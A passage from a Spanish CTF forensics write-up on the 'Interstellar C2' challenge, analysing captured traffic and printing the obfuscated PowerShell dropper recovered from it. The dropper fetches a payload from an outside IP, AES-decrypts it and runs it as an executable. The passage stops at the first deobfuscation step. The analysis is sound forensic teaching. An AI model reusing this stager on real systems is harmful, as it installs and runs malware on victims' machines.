@@ -1,0 +1,986 @@
+<!doctype html><html lang="es"><head><title>Interstellar C2 | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HTB CA 2023. Análisis de tráfico de red. Desofuscación de Powershell. Descompilación de C# .NET. Esteganografía. Cifrado AES"><meta name="image" content="https://7rocky.github.io/images/forensics.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2023. Análisis de tráfico de red. Desofuscación de Powershell. Descompilación de C# .NET. Esteganografía. Cifrado AES"><meta itemprop="keywords" content><meta itemprop="name" content="Interstellar C2"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HTB CA 2023. Análisis de tráfico de red. Desofuscación de Powershell. Descompilación de C# .NET. Esteganografía. Cifrado AES"><meta property="og:image" content="https://7rocky.github.io/images/forensics.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Interstellar C2"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HTB CA 2023. Análisis de tráfico de red. Desofuscación de Powershell. Descompilación de C# .NET. Esteganografía. Cifrado AES"><meta name="twitter:description" content="HTB CA 2023. Análisis de tráfico de red. Desofuscación de Powershell. Descompilación de C# .NET. Esteganografía. Cifrado AES"><meta name="twitter:image" content="https://7rocky.github.io/images/forensics.png"><meta name="twitter:title" content="Interstellar C2"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/htb-cyber-apocalypse/interstellar-c2/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/&amp;text=Interstellar%20C2" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/interstellar-c2/&amp;title=Interstellar%20C2" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Interstellar C2</h1><p class="mb4 f6 dib tracked">20 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#desofuscación-de-powershell">Desofuscación de PowerShell</a><ul><li><a href="#descifrando-el-ejecutable-de-_malware_">Descifrando el ejecutable de <em>malware</em></a></li></ul></li><li><a href="#descompilación-de-c-net">Descompilación de C# .NET</a></li><li><a href="#varios-descifrados">Varios descifrados</a><ul><li><a href="#ejecución-de-comandos">Ejecución de comandos</a></li><li><a href="#exfiltración-de-datos-a-través-de-imágenes-png">Exfiltración de datos a través de imágenes PNG</a></li><li><a href="#cargando-mimikatz">Cargando Mimikatz</a></li><li><a href="#tomando-capturas-de-pantalla">Tomando capturas de pantalla</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un archivo PCAP llamado <code>capture.pcapng</code>. Vamos a verlo en Wireshark:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-1.webp" alt="Interstellar C2 1"></p><p>Como siempre, es bueno comenzar a analizar protocolos de alto nivel como HTTP, así que apliquemos un filtro:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-2.webp" alt="Interstellar C2 2"></p><p>La primera petición se intenta descargar un <em>script</em> de PowerShell llamado <code>vn84.ps1</code>:</p><p><img src="/images/other/HTB%20Cyber%20Apocalypse%202023/Interstellar-C2-3.webp" alt="Interstellar C2 3"></p><h2 id="desofuscación-de-powershell">Desofuscación de PowerShell</h2><p>Podemos tomar el <em>script</em> de Wireshark y leerlo aquí:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  .(</span><span class="mtk4">"{1}{0}{2}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'T'</span><span class="mtk5">,</span><span class="mtk4">'Set-i'</span><span class="mtk5">,</span><span class="mtk4">'em'</span><span class="mtk1">) (</span><span class="mtk4">'vAriA'</span><span class="mtk5">+</span><span class="mtk4">'ble'</span><span class="mtk5">+</span><span class="mtk4">':q'</span><span class="mtk5">+</span><span class="mtk4">'L'</span><span class="mtk5">+</span><span class="mtk4">'z0so'</span><span class="mtk1">)  ( [</span><span class="mtk7 mtki">tYpe</span><span class="mtk1">](</span><span class="mtk4">"{0}{1}{2}{3}"</span><span class="mtk1"> </span><span class="mtk5">-F</span><span class="mtk4">'SySTEM.i'</span><span class="mtk5">,</span><span class="mtk4">'o.Fi'</span><span class="mtk5">,</span><span class="mtk4">'lE'</span><span class="mtk5">,</span><span class="mtk4">'mode'</span><span class="mtk1">)) ;  </span><span class="mtk5">&amp;</span><span class="mtk1">(</span><span class="mtk4">"{0}{2}{1}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'set-Vari'</span><span class="mtk5">,</span><span class="mtk4">'E'</span><span class="mtk5">,</span><span class="mtk4">'ABL'</span><span class="mtk1">) l60Yu3  ( [</span><span class="mtk7 mtki">tYPe</span><span class="mtk1">](</span><span class="mtk4">"{7}{0}{5}{4}{3}{1}{2}{6}"</span><span class="mtk5">-F</span><span class="mtk4">'m.'</span><span class="mtk5">,</span><span class="mtk4">'ph'</span><span class="mtk5">,</span><span class="mtk4">'Y.ae'</span><span class="mtk5">,</span><span class="mtk4">'A'</span><span class="mtk5">,</span><span class="mtk4">'TY.crypTOgR'</span><span class="mtk5">,</span><span class="mtk4">'SeCuRi'</span><span class="mtk5">,</span><span class="mtk4">'S'</span><span class="mtk5">,</span><span class="mtk4">'sYSte'</span><span class="mtk1">));  .(</span><span class="mtk4">"{0}{2}{1}{3}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'Set-V'</span><span class="mtk5">,</span><span class="mtk4">'i'</span><span class="mtk5">,</span><span class="mtk4">'AR'</span><span class="mtk5">,</span><span class="mtk4">'aBle'</span><span class="mtk1">)  BI34  (  [</span><span class="mtk7 mtki">TyPE</span><span class="mtk1">](</span><span class="mtk4">"{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'TEm.secU'</span><span class="mtk5">,</span><span class="mtk4">'R'</span><span class="mtk5">,</span><span class="mtk4">'Y.CrY'</span><span class="mtk5">,</span><span class="mtk4">'IT'</span><span class="mtk5">,</span><span class="mtk4">'s'</span><span class="mtk5">,</span><span class="mtk4">'Y.'</span><span class="mtk5">,</span><span class="mtk4">'D'</span><span class="mtk5">,</span><span class="mtk4">'yS'</span><span class="mtk5">,</span><span class="mtk4">'pTogrAPH'</span><span class="mtk5">,</span><span class="mtk4">'E'</span><span class="mtk5">,</span><span class="mtk4">'CrypTOSTReAmmo'</span><span class="mtk1">));  ${U`Rl} </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk4">"{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'htt'</span><span class="mtk5">,</span><span class="mtk4">'4f0'</span><span class="mtk5">,</span><span class="mtk4">'53-41ab-938'</span><span class="mtk5">,</span><span class="mtk4">'d8e51'</span><span class="mtk5">,</span><span class="mtk4">'p://64.226.84.200/9497'</span><span class="mtk5">,</span><span class="mtk4">'8'</span><span class="mtk5">,</span><span class="mtk4">'58'</span><span class="mtk5">,</span><span class="mtk4">'a-ae1bd8'</span><span class="mtk5">,</span><span class="mtk4">'-'</span><span class="mtk5">,</span><span class="mtk4">'6'</span><span class="mtk1">) </span>  
+<span class="mtk1">${P`TF} </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$env:temp</span><span class="mtk4">\94974f08-5853-41ab-938a-ae1bd86d8e51"</span><span class="mtk1"> </span>
+<span class="mtk1">.(</span><span class="mtk4">"{2}{1}{3}{0}"</span><span class="mtk5">-f</span><span class="mtk4">'ule'</span><span class="mtk5">,</span><span class="mtk4">'M'</span><span class="mtk5">,</span><span class="mtk4">'Import-'</span><span class="mtk5">,</span><span class="mtk4">'od'</span><span class="mtk1">) (</span><span class="mtk4">"{2}{0}{3}{1}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'r'</span><span class="mtk5">,</span><span class="mtk4">'fer'</span><span class="mtk5">,</span><span class="mtk4">'BitsT'</span><span class="mtk5">,</span><span class="mtk4">'ans'</span><span class="mtk1">) </span>
+<span class="mtk1">.(</span><span class="mtk4">"{4}{5}{3}{1}{2}{0}"</span><span class="mtk5">-f</span><span class="mtk4">'r'</span><span class="mtk5">,</span><span class="mtk4">'-BitsT'</span><span class="mtk5">,</span><span class="mtk4">'ransfe'</span><span class="mtk5">,</span><span class="mtk4">'t'</span><span class="mtk5">,</span><span class="mtk4">'S'</span><span class="mtk5">,</span><span class="mtk4">'tar'</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1">Source ${u`Rl} </span><span class="mtk5">-</span><span class="mtk1">Destination ${p`Tf} </span>
+<span class="mtk1">${Fs} </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1">(</span><span class="mtk4">"{1}{0}{2}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'w-Ob'</span><span class="mtk5">,</span><span class="mtk4">'Ne'</span><span class="mtk5">,</span><span class="mtk4">'ject'</span><span class="mtk1">) (</span><span class="mtk4">"{1}{2}{0}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'eam'</span><span class="mtk5">,</span><span class="mtk4">'IO.'</span><span class="mtk5">,</span><span class="mtk4">'FileStr'</span><span class="mtk1">)(${p`Tf}</span><span class="mtk5">,</span><span class="mtk1">  ( </span><span class="mtk5">&amp;</span><span class="mtk1">(</span><span class="mtk4">"{3}{1}{0}{2}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'lDIt'</span><span class="mtk5">,</span><span class="mtk4">'hi'</span><span class="mtk5">,</span><span class="mtk4">'eM'</span><span class="mtk5">,</span><span class="mtk4">'c'</span><span class="mtk1">)  (</span><span class="mtk4">'VAria'</span><span class="mtk5">+</span><span class="mtk4">'blE'</span><span class="mtk5">+</span><span class="mtk4">':Q'</span><span class="mtk5">+</span><span class="mtk4">'L'</span><span class="mtk5">+</span><span class="mtk4">'z0sO'</span><span class="mtk1">)).VALue::</span><span class="mtk4">"oP</span><span class="mtk6">`e</span><span class="mtk4">N"</span><span class="mtk1">) </span>
+<span class="mtk1">${MS} </span><span class="mtk5">=</span><span class="mtk1"> .(</span><span class="mtk4">"{3}{1}{0}{2}"</span><span class="mtk5">-f</span><span class="mtk4">'c'</span><span class="mtk5">,</span><span class="mtk4">'je'</span><span class="mtk5">,</span><span class="mtk4">'t'</span><span class="mtk5">,</span><span class="mtk4">'New-Ob'</span><span class="mtk1">) (</span><span class="mtk4">"{5}{3}{0}{2}{4}{1}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'O.Memor'</span><span class="mtk5">,</span><span class="mtk4">'eam'</span><span class="mtk5">,</span><span class="mtk4">'y'</span><span class="mtk5">,</span><span class="mtk4">'stem.I'</span><span class="mtk5">,</span><span class="mtk4">'Str'</span><span class="mtk5">,</span><span class="mtk4">'Sy'</span><span class="mtk1">); </span>
+<span class="mtk1">${a`es} </span><span class="mtk5">=</span><span class="mtk1">   (</span><span class="mtk5">&amp;</span><span class="mtk1">(</span><span class="mtk4">'GI'</span><span class="mtk1">)  VARiaBLe:l60Yu3).VAluE::(</span><span class="mtk4">"{1}{0}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'reate'</span><span class="mtk5">,</span><span class="mtk4">'C'</span><span class="mtk1">).Invoke() </span>
+<span class="mtk1">${a`Es}.</span><span class="mtk4">"KE`Y`sIZE"</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">128</span><span class="mtk1"> </span>
+<span class="mtk1">${K`EY} </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">byte</span><span class="mtk1">[]] (</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk1">) </span>
+<span class="mtk1">${iv} </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">byte</span><span class="mtk1">[]] (</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk5">,</span><span class="mtk6">1</span><span class="mtk1">) </span>
+<span class="mtk1">${a`ES}.</span><span class="mtk4">"K`EY"</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ${K`EY} </span>
+<span class="mtk1">${A`es}.</span><span class="mtk4">"i`V"</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> ${i`V} </span>
+<span class="mtk1">${cS} </span><span class="mtk5">=</span><span class="mtk1"> .(</span><span class="mtk4">"{1}{0}{2}"</span><span class="mtk5">-f</span><span class="mtk4">'e'</span><span class="mtk5">,</span><span class="mtk4">'N'</span><span class="mtk5">,</span><span class="mtk4">'w-Object'</span><span class="mtk1">) (</span><span class="mtk4">"{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'phy.Crypto'</span><span class="mtk5">,</span><span class="mtk4">'ptogr'</span><span class="mtk5">,</span><span class="mtk4">'ecuri'</span><span class="mtk5">,</span><span class="mtk4">'rea'</span><span class="mtk5">,</span><span class="mtk4">'Syste'</span><span class="mtk5">,</span><span class="mtk4">'S'</span><span class="mtk5">,</span><span class="mtk4">'m.S'</span><span class="mtk5">,</span><span class="mtk4">'m'</span><span class="mtk5">,</span><span class="mtk4">'t'</span><span class="mtk5">,</span><span class="mtk4">'ty.Cry'</span><span class="mtk5">,</span><span class="mtk4">'a'</span><span class="mtk1">)(${m`S}</span><span class="mtk5">,</span><span class="mtk1"> ${a`Es}.(</span><span class="mtk4">"{0}{3}{2}{1}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'Cre'</span><span class="mtk5">,</span><span class="mtk4">'or'</span><span class="mtk5">,</span><span class="mtk4">'pt'</span><span class="mtk5">,</span><span class="mtk4">'ateDecry'</span><span class="mtk1">).Invoke()</span><span class="mtk5">,</span><span class="mtk1">   (</span><span class="mtk5">&amp;</span><span class="mtk1">(</span><span class="mtk4">"{1}{2}{0}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'ARIaBLE'</span><span class="mtk5">,</span><span class="mtk4">'Ge'</span><span class="mtk5">,</span><span class="mtk4">'T-V'</span><span class="mtk1">)  bI34  </span><span class="mtk5">-</span><span class="mtk1">VaLue )::</span><span class="mtk4">"W`RItE"</span><span class="mtk1">); </span>
+<span class="mtk1">${f`s}.(</span><span class="mtk4">"{1}{0}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'To'</span><span class="mtk5">,</span><span class="mtk4">'Copy'</span><span class="mtk1">).Invoke(${Cs}) </span>
+<span class="mtk1">${d`ecD} </span><span class="mtk5">=</span><span class="mtk1"> ${M`s}.(</span><span class="mtk4">"{0}{1}{2}"</span><span class="mtk5">-f</span><span class="mtk4">'T'</span><span class="mtk5">,</span><span class="mtk4">'oAr'</span><span class="mtk5">,</span><span class="mtk4">'ray'</span><span class="mtk1">).Invoke() </span>
+<span class="mtk1">${C`S}.(</span><span class="mtk4">"{1}{0}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'te'</span><span class="mtk5">,</span><span class="mtk4">'Wri'</span><span class="mtk1">).Invoke(${d`ECD}</span><span class="mtk5">,</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk5">,</span><span class="mtk1"> ${d`ECd}.</span><span class="mtk4">"LENg`TH"</span><span class="mtk1">); </span>
+<span class="mtk1">${D`eCd} </span><span class="mtk5">|</span><span class="mtk1"> .(</span><span class="mtk4">"{2}{3}{1}{0}"</span><span class="mtk1"> </span><span class="mtk5">-f</span><span class="mtk4">'ent'</span><span class="mtk5">,</span><span class="mtk4">'t-Cont'</span><span class="mtk5">,</span><span class="mtk4">'S'</span><span class="mtk5">,</span><span class="mtk4">'e'</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1">Path </span><span class="mtk4">"</span><span class="mtk1">$env:temp</span><span class="mtk4">\tmp7102591.exe"</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">Encoding (</span><span class="mtk4">"{1}{0}"</span><span class="mtk5">-f</span><span class="mtk1"> </span><span class="mtk4">'yte'</span><span class="mtk5">,</span><span class="mtk4">'B'</span><span class="mtk1">) </span>
+<span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">$env:temp</span><span class="mtk4">\tmp7102591.exe"</span>
+</code></pre></div><p>Bueno, no es muy legible, ¿verdad? Está ofuscado, pero podemos transformarlo un poco evaluando algunas expresiones en PowerShell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwsh</span>
+PowerShell 7.3.3
+PS .../Interstellar C2&gt; <span class="code-dark-cyan">"{1}{0}{2}"</span> <span class="code-grey">-f</span><span class="code-dark-cyan">'T'</span><span class="code-grey">,</span><span class="code-dark-cyan">'Set-i'</span><span class="code-grey">,</span><span class="code-dark-cyan">'em'</span>
+Set-iTem
